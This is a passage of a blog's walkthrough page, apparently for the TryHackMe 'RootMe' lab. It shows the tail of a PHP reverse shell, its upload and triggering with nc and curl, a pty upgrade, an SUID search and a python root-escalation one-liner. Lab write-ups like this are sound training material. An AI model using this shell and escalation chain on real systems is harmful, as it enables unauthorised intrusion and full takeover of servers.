+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fwrite</span>($pipes[<span style="color:#ae81ff">0</span>], $input);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>($pipes[<span style="color:#ae81ff">1</span>], $read_a)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;STDOUT READ&#34;</span>);
+</span></span><span style="display:flex;"><span>		$input <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($pipes[<span style="color:#ae81ff">1</span>], $chunk_size);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;STDOUT: </span><span style="color:#e6db74">$input</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fwrite</span>($sock, $input);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>($pipes[<span style="color:#ae81ff">2</span>], $read_a)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;STDERR READ&#34;</span>);
+</span></span><span style="display:flex;"><span>		$input <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($pipes[<span style="color:#ae81ff">2</span>], $chunk_size);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ($debug) <span style="color:#a6e22e">printit</span>(<span style="color:#e6db74">&#34;STDERR: </span><span style="color:#e6db74">$input</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fwrite</span>($sock, $input);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fclose</span>($sock);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">2</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">proc_close</span>($process);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">printit</span> ($string) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$daemon) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$string\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Now you can upload your shell to the /panel page. To verify it has been successfully uploaded browse to http://ATTACKIP/uploads. You should see your upload there.</p>
+<p>In your terminal set up a 
+<a href="https://www.youtube.com/watch?v=1kHXf51Sqpk&amp;t=1s" target="_blank">listener</a>. This will be the same port you specified in your shell.</p>
+<p><code>nc -lvnp 1234</code></p>
+<p>Now that your listener is set up, you can either click on your shell in the /uploads directory or curl the shell like the below.</p>
+<p><code>curl http://10.10.196.184/uploads/shell.php5 </code></p>
+<p>You should get a connection. Now that you have a connection I like to upgrade my shell a little with the following commands.</p>
+<p><code>cat /etc/shells</code> will tell you which shells are available. If you want to use a specific shell.</p>
+<p><code>python --version</code> will tell you which python version, if any, is available on the host. In our case it&rsquo;s python 2.</p>
+<p><code>python2 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code> This will upgrade our basic shell into a bash shell.</p>
+<p><a href="#R-image-af754d20d421d4d630d74f8bf604f945" class="lightbox-link"><img src="/walkthroughs/rootme/Task3_shell2.png" alt="Shell" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-af754d20d421d4d630d74f8bf604f945"><img src="/walkthroughs/rootme/Task3_shell2.png" alt="Shell" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>The next thing to do is to find and cat the user flag.</p>
+<p><code>find / -type f -name user.txt 2&gt; /dev/null</code></p>
+<p>One of my favorite websites is 
+<a href="https://explainshell.com" target="_blank">explainshell.com</a>. Try typing in the above command to learn what it does.</p>
+<p><code>cat /var/www/user.txt</code></p>
+<blockquote>
+<p>user.txt</p>
+</blockquote>
+<blockquote>
+<p>Answer: cat /var/www/user.txt</p>
+</blockquote>
+<h2 id="task-4-privilege-escalation">Task 4: Privilege escalation</h2>
+<p>The first task asks you to search for files with SUID permissions. You can do this with the following find command <code>find / -perm -u=s -type f 2&gt;/dev/null</code>. This searches all files where the current user can execute the file as if they were the owner, even if that file owner is root.</p>
+<p>Now you can look through this list to see which file looks out of the ordinary.</p>
+<p><a href="#R-image-c76c40dd271eea8caaf2017ca796cc8b" class="lightbox-link"><img src="/walkthroughs/rootme/Task4_SUID.png" alt="SUID search" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-c76c40dd271eea8caaf2017ca796cc8b"><img src="/walkthroughs/rootme/Task4_SUID.png" alt="SUID search" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<blockquote>
+<p>Search for files with SUID permission, which file is weird?</p>
+</blockquote>
+<blockquote>
+<p>Answer: /usr/bin/python</p>
+</blockquote>
+<blockquote>
+<p>Find a form to escalate your privileges.</p>
+</blockquote>
+<blockquote>
+<p>Answer: No answer needed</p>
+</blockquote>
+<p>Next you can use GTFOBins to find the correct bypass for 
+<a href="https://gtfobins.github.io/gtfobins/python/" target="_blank">python</a>.</p>
+<p><a href="#R-image-3fc612336ebad0de81f69d78ed19b5b1" class="lightbox-link"><img src="/walkthroughs/rootme/Task4_SUIDpy.png" alt="Python SUID" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-3fc612336ebad0de81f69d78ed19b5b1"><img src="/walkthroughs/rootme/Task4_SUIDpy.png" alt="Python SUID" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Since you know python is already installed you can skip the first line in GTFOBins. Remember to specify your path and you should be able to escalate to root.</p>
+<div class="wrap-code highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">./</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import os; os.execl(&#34;/bin/sh&#34;, &#34;sh&#34;, &#34;-p&#34;)&#39;</span></span></span></code></pre></div><p>Once you are root all that is left to do is find (<code>find / -type f -name root.txt</code>) and cat (<code>cat /root/root.txt </code>) the flag.</p>
+<p><code>cat /root/root.txt </code></p>
+<p><a href="#R-image-9bc47e679f617a7393c7980a95e5e2f3" class="lightbox-link"><img src="/walkthroughs/rootme/Task4_root2.png" alt="find root" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-9bc47e679f617a7393c7980a95e5e2f3"><img src="/walkthroughs/rootme/Task4_root2.png" alt="find root" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<blockquote>
+<p>root.txt</p>
+</blockquote>
+<blockquote>
+<p>Answer: cat root.txt</p>
+</blockquote>
+
+            <footer class="footline">
+            </footer>
+          </article>
+        </div>
+      </main>
+    </div>
+    <aside id="R-sidebar" class="default-animation">
+      <div id="R-header-topbar" class="default-animation"></div>
+      <div id="R-header-wrapper" class="default-animation">
+        <div id="R-header" class="default-animation">
+<a href="/index.html">
+    <img src="/images/logo.png" 
+        width="200"
+        height="120"
+        alt="Website logo of hacker cat"/>
+    <h2 style="padding:0; margin:0;">H1roBytes</h2>
+</a>
+        </div>
+        <div class="searchbox default-animation">
+          <i class="fas fa-search" title="Search (CTRL+ALT+f)"></i>
+          <label class="a11y-only" for="R-search-by">Search</label>
+          <input data-search-input id="R-search-by" name="search-by" class="search-by" type="search" placeholder="Search...">
+          <button class="search-clear" type="button" data-search-clear="" title="Clear search"><i class="fas fa-times" title="Clear search"></i></button>
+        </div>
+        <script>
+          var contentLangs=['en'];
+        </script>
+        <script src="/js/auto-complete.js?1738202701" defer></script>
+        <script src="/js/lunr/lunr.min.js?1738202701" defer></script>
+        <script src="/js/lunr/lunr.stemmer.support.min.js?1738202701" defer></script>
+        <script src="/js/lunr/lunr.multi.min.js?1738202701" defer></script>
+        <script src="/js/lunr/lunr.en.min.js?1738202701" defer></script>
+        <script src="/js/search.js?1738202701" defer></script>
+      </div>
+      <div id="R-homelinks" class="default-animation">
+        <hr class="padding">
+      </div>
+      <div id="R-content-wrapper" class="highlightable">
+        <div id="R-topics">
+          <ul class="enlarge morespace collapsible-menu">
+          <li data-nav-id="/walkthroughs/index.html" class="parent "><input type="checkbox" id="R-section-a25630664138ae6b33064dc3d9c0b30e" aria-controls="R-subsections-a25630664138ae6b33064dc3d9c0b30e" checked><label for="R-section-a25630664138ae6b33064dc3d9c0b30e"><i class="fas fa-chevron-down"></i><i class="fas fa-chevron-right"></i><span class="a11y-only">Submenu Walkthroughs</span></label><a class="padding" href="/walkthroughs/index.html">Walkthroughs</a><ul id="R-subsections-a25630664138ae6b33064dc3d9c0b30e" class="morespace collapsible-menu">
+          <li data-nav-id="/walkthroughs/2023-advent-of-cyber/index.html" class=""><a class="padding" href="/walkthroughs/2023-advent-of-cyber/index.html">Advent of Cyber 2023! - TryHackMe</a></li>
+          <li data-nav-id="/walkthroughs/cozyhosting/index.html" class=""><a class="padding" href="/walkthroughs/cozyhosting/index.html">Cozy Hosting - Hack The Box</a></li>
+          <li data-nav-id="/walkthroughs/kenobi/index.html" class=""><a class="padding" href="/walkthroughs/kenobi/index.html">Kenobi - TryHackMe</a></li>
+          <li data-nav-id="/walkthroughs/nibbles/index.html" class=""><a class="padding" href="/walkthroughs/nibbles/index.html">Nibbles - HTB</a></li>
+          <li data-nav-id="/walkthroughs/red-team-engagements/index.html" class=""><a class="padding" href="/walkthroughs/red-team-engagements/index.html">Red Team Engagements - TryHackMe</a></li>
+          <li data-nav-id="/walkthroughs/red-team-fundamentals/index.html" class=""><a class="padding" href="/walkthroughs/red-team-fundamentals/index.html">Red Team Fundamentals - TryHackMe</a></li>
+          <li data-nav-id="/walkthroughs/rootme/index.html" class="active"><a class="padding" href="/walkthroughs/rootme/index.html">RootMe - TryHackMe</a></li>
+          <li data-nav-id="/walkthroughs/steel-mountain/index.html" class=""><a class="padding" href="/walkthroughs/steel-mountain/index.html">Steel Mountain - TryHackMe</a></li></ul></li>
+          <li data-nav-id="/resources/index.html" class=""><input type="checkbox" id="R-section-4fbbb0c8ab4cb18ef7db60d823ac6d24" aria-controls="R-subsections-4fbbb0c8ab4cb18ef7db60d823ac6d24"><label for="R-section-4fbbb0c8ab4cb18ef7db60d823ac6d24"><i class="fas fa-chevron-down"></i><i class="fas fa-chevron-right"></i><span class="a11y-only">Submenu Resources</span></label><a class="padding" href="/resources/index.html">Resources</a><ul id="R-subsections-4fbbb0c8ab4cb18ef7db60d823ac6d24" class="morespace collapsible-menu">
+          <li data-nav-id="/resources/active-directory-enumeration/index.html" class=""><a class="padding" href="/resources/active-directory-enumeration/index.html">Active Directory Enumeration</a></li></ul></li>
+          <li data-nav-id="/contact/index.html" class=""><a class="padding" href="/contact/index.html">Contact</a></li>
+          </ul>
+        </div>
+        <div class="padding footermargin footerLangSwitch footerVariantSwitch footerVisitedLinks footerFooter showVariantSwitch showFooter"></div>
+        <div id="R-menu-footer">
+          <hr class="padding default-animation footerLangSwitch footerVariantSwitch footerVisitedLinks footerFooter showVariantSwitch showFooter">
+          <div id="R-prefooter" class="footerLangSwitch footerVariantSwitch footerVisitedLinks showVariantSwitch">
+            <ul>
+              <li id="R-select-language-container" class="footerLangSwitch">
+                <div class="padding menu-control">
+                  <i class="fas fa-language fa-fw"></i>
+                  <span>&nbsp;</span>
+                  <div class="control-style">
+                    <label class="a11y-only" for="R-select-language">Language</label>
+                    <select id="R-select-language" onchange="location = baseUri + this.value;">
+                      <option id="R-en" value="/walkthroughs/rootme/index.html" lang="en" selected></option>
+                    </select>
+                  </div>
+                  <div class="clear"></div>
+                </div>
+              </li>
+              <li id="R-select-variant-container" class="footerVariantSwitch showVariantSwitch">
+                <div class="padding menu-control">
+                  <i class="fas fa-paint-brush fa-fw"></i>
+                  <span>&nbsp;</span>
+                  <div class="control-style">
+                    <label class="a11y-only" for="R-select-variant">Theme</label>
+                    <select id="R-select-variant" onchange="window.variants && variants.changeVariant( this.value );">
+                      <option id="R-relearn-dark" value="relearn-dark" selected>Relearn Dark</option>
+                      <option id="R-zen-dark" value="zen-dark">Zen Dark</option>
+                      <option id="R-relearn-bright" value="relearn-bright">Relearn Bright</option>
+                      <option id="R-relearn-light" value="relearn-light">Relearn Light</option>
+                      <option id="R-zen-light" value="zen-light">Zen Light</option>
+                      <option id="R-neon" value="neon">Neon</option>
+                      <option id="R-learn" value="learn">Learn</option>
+                      <option id="R-blue" value="blue">Blue</option>
+                      <option id="R-green" value="green">Green</option>
+                      <option id="R-red" value="red">Red</option>
+                    </select>
+                  </div>
+                  <div class="clear"></div>
+                </div>
+                <script>window.variants && variants.markSelectedVariant();</script>
+              </li>
+              <li class="footerVisitedLinks">
+                <div class="padding menu-control">
+                  <i class="fas fa-history fa-fw"></i>
+                  <span>&nbsp;</span>
+                  <div class="control-style">
+                    <button onclick="clearHistory();">Clear History</button>
+                  </div>
+                  <div class="clear"></div>
+                </div>
+              </li>
+            </ul>
+          </div>
+          <div id="R-footer" class="footerFooter showFooter">
+	    <p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p>
+		<p><a href="https://hirobytes.xyz/disclaimer">Disclaimer</a></p>
+          </div>
+        </div>
+      </div>
+    </aside>
+    <script src="/js/clipboard.min.js?1738202701" defer></script>
+    <script src="/js/perfect-scrollbar.min.js?1738202701" defer></script>
+    <script>
+      function useMathJax( config ){
+        if( !Object.assign ){
+          
+          return;
+        }
+        window.MathJax = Object.assign( window.MathJax || {}, {
+          loader: {
+            load: ['[tex]/mhchem']
+          },
+          startup: {
+            elements: [
+              '.math'
+            ]
+          },
+          tex: {
+            inlineMath: [
+              ['$', '$'], 
+              ['\\(', '\\)']
+            ]
+          },
+          options: {
+            enableMenu: false 
+          }
+        }, config );
+      }
+      useMathJax( JSON.parse( null ) );
+    </script>
+    <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+    <script src="/js/d3/d3-color.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-dispatch.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-drag.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-ease.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-interpolate.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-selection.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-timer.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-transition.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-zoom.min.js?1738202701" defer></script>
+    <script src="/js/js-yaml.min.js?1738202701" defer></script>
+    <script src="https://unpkg.com/mermaid/dist/mermaid.min.js" defer></script>
+    <script>
+      window.themeUseMermaid = JSON.parse( null );
+    </script>
+    <script>window.noZensmooth = true;</script>
+    <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-bundle.js" defer></script>
+    <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-standalone-preset.js" defer></script>
+    <script>
+      window.themeUseOpenapi = { css: "https://unpkg.com/swagger-ui-dist/swagger-ui.css", assetsBuster:  1738202701  };
+    </script>
+    <script src="/js/theme.js?1738202701" defer></script>
+  </body>
+</html>
